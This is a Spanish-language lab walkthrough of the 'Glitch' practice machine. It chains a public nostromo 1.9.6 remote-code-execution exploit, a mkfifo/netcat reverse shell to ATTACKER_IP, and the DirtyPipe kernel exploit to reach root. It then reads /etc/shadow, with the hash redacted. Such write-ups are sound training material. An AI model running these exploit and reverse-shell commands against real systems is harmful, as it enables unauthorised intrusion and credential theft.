# Máquina Glitch

#### OS: Linux
#### Tier: Warmup
#### IP de ejemplo: 172.20.6.184

## Reconocimiento
comenzamos realizando un escaneo de puertos por tcp con `nmap`:
```
sudo nmap -sS -p- --open --min-rate 5000 -vvv -Pn -n 172.20.6.184 
```
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
> P1: Which port(s) are open?

dos puertos abiertos: 22/SSH y 80/HTTP. 
Vamos a lanzar los scripts básicos de nmap con el argumento -sC y tratemos de detectar la versión para cada servicio con -sV 
```
nmap -sCV -p22,80 -T4 172.20.6.184
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 8b:4b:62:52:69:d8:6a:2a:f3:00:5f:50:cf:35:f4:78 (RSA)
|   256 c7:1f:64:af:f5:f7:0d:03:d0:5a:62:f3:e7:68:07:67 (ECDSA)
|_  256 62:3b:0e:5b:07:c7:a4:5e:9f:15:7c:2d:cb:17:32:3b (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: Coming Soon
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Antes de entrar a la web, vamos a añadir el dominio a /etc/hosts
```
172.20.6.184 goldnertech.hv
```
ahora sí, entramos

![imagen](assets/glitch-front.png)

> P2: What is the name of the running web server?

literalmente nada. Tampoco en el source code. Sin embargo, gracias al reconocimiento con nmap podemos ver que esta web está construida en `nostromo 1.9.6`. 

SI buscamos vulnerabilidades encontramos lo siguiente:
```
❯ searchsploit nostromo 1.9.6
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
nostromo 1.9.6 - Remote Code Execution                                | multiple/remote/47837.py
---------------------------------------------------------------------- ---------------------------------
```

es perfecto, vamos a traer el script y a renombrarlo nostromo.py
```
❯ searchsploit -m multiple/remote/47837.py
<SNIP>
❯ mv 47837.py nostromo.py

```

> P3: What is the CVE code of the vulnerability?

si le echamos un vistazo con `cat nostromo.py`, podemos ver que el CVE asociado es el CVE-2019-16278.

al ejecutar el script, nos damos cuenta de que está escrito en python2. Vamos a buscar un PoC más actualizado
```
CVE-2019-16278 PoC Python3
```

![imagen](assets/glitch-poc.png)

este parece adecuado. Copiemos directamente el código, sobreescribimos el antiguo nostromo.py y verificamos que es Python3 y funciona

```
❯ python3 nostromo.py
usage: nostromo.py [-h] host port [cmd]
nostromo.py: error: the following arguments are required: host, port
```

ahora solo falta poner los datos correctos
```
❯ python3 nostromo.py 172.20.6.184 80 id
[+] Connecting to target
[+] Sending malicious payload
HTTP/1.1 200 OK
Date: Fri, 13 Nov 2026 16:25:01 GMT
Server: nostromo 1.9.6
Connection: close


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

tenemos RCE.

## Initial Infiltration

para entrar en la máquina ejecutaremos una reverse shell con `mkfifo`, una reverse shell bastante estable, para evitar problemas de caracteres especiales
```
❯ python3 nostromo.py 172.20.6.184 80 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f'
```

en otra terminal escuchamos en el puerto que hayamos elegido, en mi caso 8443

```
❯ nc -lvnp 8443
Listening on 0.0.0.0 8443
Connection received on 172.20.6.184 43490
/bin/sh: 0: can't access tty; job control turned off
$
```

estamos como www-data en la máquina. 

## Privilege Escalation 


Estabilizamos la shell:
```
script /dev/null -c bash
Ctrl + z
❯ stty raw -echo;fg
reset xterm
Enter
```
y buscamos usuarios para hacer movimiento lateral

```
www-data@debian:/usr/bin$ ls /home
hackviser

www-data@debian:/home/hackviser$ find / -user hackviser 2>/dev/null
/home/hackviser
/home/hackviser/.bashrc
/home/hackviser/.profile
/home/hackviser/.bash_logout
```

está el usuario hackviser, pero no parece tener nada a su nombre. Veamos entonces otras posibilidades, la pregunta 4 nos da una pista:

> P4: What is the Linux kernel version?

```
www-data@debian:/home/hackviser$ uname -a
Linux debian 5.11.0-051100-generic <...>
```
veamos si es vulnerable a algún exploit de kernel. 
```
Linux debian 5.11.0-051100-generic exploit
```

Al buscar en internet inmediatamente se menciona un conocido exploit de kernel: `DirtyPipe`. Esta vulnerabilidad permite a un usuario con bajos privilegios sobreescribir e inyectar información en un archivo de solo lectura. Si se hace en un binario SUID, por ejemplo, podemos ejecutarlos como el usuario root

```
The Linux kernel version 5.11.0-051100-generic is vulnerable to CVE-2022-0847 (DirtyPipe) 
```

podemos usar el siguiente repositorio para explotar esta vulnerabilidad:
```
https://github.com/LudovicPatho/CVE-2022-0847_dirty-pipe
```

una vez clonado nos aseguramos de que el target tiene gcc para compilar el binario (de lo contrario deberíamos hacerlo nosotros en nuestra máquina local y transferirlo posteriormente con un servidor en python3)
```
www-data@debian:/tmp$ which gcc
/usr/bin/gcc
```
hay gcc, podemos copiar directamente dirtypipez.c en nuestra clipboard
```
❯ cat dirtypipez.c | xclip -sel clip
```
y lo pegamos en /tmp/dirtypipez.c
```
nano /tmp/dirtypipez.c
```
compilamos con gcc
```
www-data@debian:/tmp$ gcc dirtypipez.c -o exploit
```
y finalmente lo ejecutamos. Eligiendo como target el binario SUID /bin/su
```
www-data@debian:/tmp$ ./exploit /bin/su
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# whoami
root
```

> P5: What is the password hash value in /etc/shadow for the user "hackviser"?

ya que somos root, podemos leer el /etc/shadow de la máquina
```
cat /etc/shadow
```
y pegamos el hash, desde `$y$` hasta `:19643:0:99999:7:::` (sin incluir esto último)

```
hackviser:$y$j9T$/tk8y1<REDACTED>kM9
```
completamos todas las flags; Máquina Glitch pwned.
